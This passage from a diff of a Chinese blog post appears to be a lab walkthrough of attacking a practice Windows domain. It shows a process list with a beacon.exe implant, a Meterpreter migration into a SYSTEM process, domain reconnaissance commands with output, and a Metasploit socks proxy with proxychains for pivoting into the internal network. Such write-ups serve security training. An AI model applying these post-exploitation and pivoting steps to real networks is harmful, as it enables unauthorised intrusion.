+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1500&lt;/span> &lt;span class="m">3408&lt;/span> svchost.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\w&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\s&lt;/span>vchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1604&lt;/span> &lt;span class="m">488&lt;/span> taskhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1700&lt;/span> &lt;span class="m">488&lt;/span> vmtoolsd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1772&lt;/span> &lt;span class="m">3648&lt;/span> beacon.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\p&lt;/span>hpStudy&lt;span class="se">\W&lt;/span>WW&lt;span class="se">\b&lt;/span>eacon.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">1972&lt;/span> &lt;span class="m">488&lt;/span> sppsvc.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2000&lt;/span> &lt;span class="m">1500&lt;/span> msiexec.exe x64 &lt;span class="m">0&lt;/span> C:&lt;span class="se">\w&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\m&lt;/span>siexec.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2112&lt;/span> &lt;span class="m">488&lt;/span> msdtc.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2124&lt;/span> &lt;span class="m">4028&lt;/span> cmd.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\S&lt;/span>ysWOW64&lt;span class="se">\c&lt;/span>md.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2180&lt;/span> &lt;span class="m">444&lt;/span> powershell.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\S&lt;/span>ysWOW64&lt;span class="se">\W&lt;/span>indowsPowerShell&lt;span class="se">\v&lt;/span>1.0&lt;span class="se">\p&lt;/span>ow
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ershell.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2244&lt;/span> &lt;span class="m">2880&lt;/span> httpd.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\p&lt;/span>hpStudy&lt;span class="se">\A&lt;/span>pache&lt;span class="se">\b&lt;/span>in&lt;span class="se">\h&lt;/span>ttpd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2328&lt;/span> &lt;span class="m">604&lt;/span> WmiPrvSE.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2536&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2868&lt;/span> &lt;span class="m">2124&lt;/span> beacon.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\p&lt;/span>hpStudy&lt;span class="se">\W&lt;/span>WW&lt;span class="se">\b&lt;/span>eacon.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2880&lt;/span> &lt;span class="m">2768&lt;/span> httpd.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\p&lt;/span>hpStudy&lt;span class="se">\A&lt;/span>pache&lt;span class="se">\b&lt;/span>in&lt;span class="se">\h&lt;/span>ttpd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2888&lt;/span> &lt;span class="m">2768&lt;/span> mysqld.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\p&lt;/span>hpStudy&lt;span class="se">\M&lt;/span>ySQL&lt;span class="se">\b&lt;/span>in&lt;span class="se">\m&lt;/span>ysqld.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2900&lt;/span> &lt;span class="m">604&lt;/span> slui.exe x64 &lt;span class="m">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">2980&lt;/span> &lt;span class="m">328&lt;/span> conhost.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\c&lt;/span>onhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3352&lt;/span> &lt;span class="m">488&lt;/span> SearchIndexer.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3456&lt;/span> &lt;span class="m">328&lt;/span> conhost.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\c&lt;/span>onhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3588&lt;/span> &lt;span class="m">2868&lt;/span> rundll32.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>yswow64&lt;span class="se">\r&lt;/span>undll32.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3648&lt;/span> &lt;span class="m">3740&lt;/span> cmd.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\S&lt;/span>ysWOW64&lt;span class="se">\c&lt;/span>md.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3656&lt;/span> &lt;span class="m">836&lt;/span> dwm.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3680&lt;/span> &lt;span class="m">3648&lt;/span> explorer.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3688&lt;/span> &lt;span class="m">328&lt;/span> conhost.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\c&lt;/span>onhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3692&lt;/span> &lt;span class="m">328&lt;/span> conhost.exe x64 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\s&lt;/span>ystem32&lt;span class="se">\c&lt;/span>onhost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3740&lt;/span> &lt;span class="m">2244&lt;/span> cmd.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\S&lt;/span>ysWOW64&lt;span class="se">\c&lt;/span>md.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3832&lt;/span> &lt;span class="m">488&lt;/span> svchost.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3896&lt;/span> &lt;span class="m">3680&lt;/span> vmtoolsd.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3912&lt;/span> &lt;span class="m">3680&lt;/span> Everything.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">3932&lt;/span> &lt;span class="m">3680&lt;/span> openvpn-gui.exe
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">4028&lt;/span> &lt;span class="m">2244&lt;/span> cmd.exe x86 &lt;span class="m">0&lt;/span> GOD&lt;span class="se">\A&lt;/span>dministrator C:&lt;span class="se">\W&lt;/span>indows&lt;span class="se">\S&lt;/span>ysWOW64&lt;span class="se">\c&lt;/span>md.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接迁移到已经是SYSTEM权限的msiexec进程&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">migrate &lt;span class="m">2000&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kudlnmj30d604jt9v.jpg"
+loading="lazy"
+alt="image-20260615175712526"
+>&lt;/p>
+&lt;p>现在我们已经拿到这台windows主机的system了&lt;/p>
+&lt;p>接下来进行域内信息搜集&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">C&lt;span class="p">:&lt;/span>&lt;span class="nl">\phpStudy\WWW&lt;/span>&lt;span class="c1">&amp;gt;ipconfig /all&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ipconfig /all
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Windows IP Configuration
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Host Name . . . . . . . . . . . . : stu1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Primary Dns Suffix . . . . . . . : god.org
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Node Type . . . . . . . . . . . . : Hybrid
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IP Routing Enabled. . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> WINS Proxy Enabled. . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Suffix Search List. . . . . . : god.org
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ethernet adapter ������� 5:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection #3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-50-56-B1-90-E9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Link-local IPv6 Address . . . . . : fe80::1414:c326:29:9100&lt;span class="nv">%2&lt;/span>6(Preferred)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IPv4 Address. . . . . . . . . . . : 192.168.111.20(Preferred)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Subnet Mask . . . . . . . . . . . : 255.255.255.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Default Gateway . . . . . . . . . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCPv6 IAID . . . . . . . . . . . : 721440854
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1&lt;span class="nv">%1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fec0:0:0:ffff::2&lt;span class="nv">%1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fec0:0:0:ffff::3&lt;span class="nv">%1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NetBIOS over Tcpip. . . . . . . . : Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ethernet adapter Npcap Loopback Adapter:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Npcap Loopback Adapter
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 02-00-4C-4F-4F-50
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Link-local IPv6 Address . . . . . : fe80::b461:ccad:e30f:81ba&lt;span class="nv">%2&lt;/span>4(Preferred)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration IPv4 Address. . : 169.254.129.186(Preferred)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Subnet Mask . . . . . . . . . . . : 255.255.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Default Gateway . . . . . . . . . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCPv6 IAID . . . . . . . . . . . : 268566604
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1&lt;span class="nv">%1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fec0:0:0:ffff::2&lt;span class="nv">%1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> fec0:0:0:ffff::3&lt;span class="nv">%1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NetBIOS over Tcpip. . . . . . . . : Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ethernet adapter ������� 3:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : TAP-Windows Adapter V9 #2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-FF-56-0B-EA-FC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ethernet adapter ������� 2:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : TAP-Windows Adapter V9
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-FF-44-8D-CB-B5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Ethernet adapter �������:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-50-56-B1-10-1E
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Link-local IPv6 Address . . . . . : fe80::b439:d46:3203:bdf3&lt;span class="nv">%1&lt;/span>1(Preferred)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IPv4 Address. . . . . . . . . . . : 192.168.52.143(Preferred)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Subnet Mask . . . . . . . . . . . : 255.255.255.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Default Gateway . . . . . . . . . : 192.168.52.2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCPv6 IAID . . . . . . . . . . . : 234884137
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-24-F3-A2-4E-00-0C-29-A7-C1-A8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Servers . . . . . . . . . . . : 192.168.52.138
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 8.8.8.8
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NetBIOS over Tcpip. . . . . . . . : Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tunnel adapter isatap.{4DAEBDFD-0177-4691-8243-B73297E2F0FF}:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Microsoft ISATAP Adapter
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tunnel adapter isatap.{560BEAFC-DAC4-4687-A564-57790875DC43}:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Microsoft ISATAP Adapter #2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tunnel adapter isatap.{448DCBB5-7D61-4538-9C03-66B5CDAD1222}:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Microsoft ISATAP Adapter #3
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tunnel adapter isatap.{EC57C4EB-763E-4000-9CDE-4D7FF15DF74C}:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Microsoft ISATAP Adapter #4
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Tunnel adapter isatap.{3333F97E-7734-4F23-9CBD-3435C7F5B981}:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Media State . . . . . . . . . . . : Media disconnected
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Connection-specific DNS Suffix . :
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Description . . . . . . . . . . . : Microsoft ISATAP Adapter #5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DHCP Enabled. . . . . . . . . . . : No
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Autoconfiguration Enabled . . . . : Yes
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>发现存在域god.org&lt;/p>
+&lt;p>使用&lt;code>net view /domain&lt;/code>看看有几个域&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax1.sinaimg.cn/large/009XQ7msly1ie69kuagvzj30ph06ewfm.jpg"
+loading="lazy"
+alt="image-20260615180423845"
+>&lt;/p>
+&lt;p>我们发现只有唯一一个域，域控主机名是GOD&lt;/p>
+&lt;p>我们接着查询所有域内主机，如下所示&lt;code>net view&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69ku6e5vj30ov06rgmq.jpg"
+loading="lazy"
+alt="image-20260615180541206"
+>&lt;/p>
+&lt;p>用&lt;code>arp -a&lt;/code>查询域内IP&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax3.sinaimg.cn/large/009XQ7msly1ie69ku305xj30hn0g9gr7.jpg"
+loading="lazy"
+alt="image-20260615180634753"
+>&lt;/p>
+&lt;p>为了确定哪个是域控主机IP，我们尝试去ping一下域名&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69ktys5tj30j1091gp5.jpg"
+loading="lazy"
+alt="image-20260615180832983"
+>&lt;/p>
+&lt;p>查询 DNS SRV 记录&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">C&lt;span class="p">:&lt;/span>&lt;span class="nl">\phpStudy\WWW&lt;/span>&lt;span class="c1">&amp;gt;nslookup -type=SRV _ldap._tcp.dc._msdcs.god.org&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nslookup -type=SRV _ldap._tcp.dc._msdcs.god.org
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">DNS request timed out.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> timeout was 2 seconds.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Server: UnKnown
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Address: 192.168.52.138
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_ldap._tcp.dc._msdcs.god.org SRV service location:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> priority = 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> weight = 100
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> port = 389
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> svr hostname = owa.god.org
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">owa.god.org internet address = 192.168.52.138
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>至此我们域内信息收集完毕&lt;/p>
+&lt;p>域名为 god&lt;/p>
+&lt;p>域中有三台主机：&lt;/p>
+&lt;blockquote>
+&lt;p>stu1.god.org&lt;/p>
+&lt;p>root-tvi862ubeh.god.org 192.168.52.141&lt;/p>
+&lt;p>owa.god.org 192.168.52.138 域控主机&lt;/p>&lt;/blockquote>
+&lt;p>由于kali攻击机无法直接访问内网的Windows server 2008，所以只能通过在Windows7上面架设一个socks代理服务器，通过这个socks代理进入内网，从而控制Windows server 2008。&lt;/p>
+&lt;p>使用MSF开启socks代理&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use auxiliary/server/socks_proxy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> version 4a
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> srvhost 0.0.0.0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">set&lt;/span> srvport &lt;span class="m">1080&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过jobs可查看代理设置成功&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax2.sinaimg.cn/large/009XQ7msly1ie69ktp1brj30jc05bt9u.jpg"
+loading="lazy"
+alt="image-20260615182125192"
+>&lt;/p>
+&lt;p>使用kali代理从而访问内网 &lt;code>vim /etc/proxychains4.conf&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69ktl1d5j308s04oq3d.jpg"
+loading="lazy"
+alt="image-20260615182304737"
+>&lt;/p>
+&lt;p>火狐浏览器配置本机自动检测代理模式&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69ktgfljj30xx0sgdk9.jpg"
+loading="lazy"
+alt="image-20260615182358719"
+>&lt;/p>
+&lt;p>输入&lt;code>proxychains firefox 192.168.52.138:80&lt;/code> 成功访问内网web网站成功访问内网&lt;/p>
+&lt;p>&lt;img src="https://i0.wp.com/tvax4.sinaimg.cn/large/009XQ7msly1ie69ksar47j31dm0hpagr.jpg"
+loading="lazy"
+alt="image-20260615182419048"
+>&lt;/p>
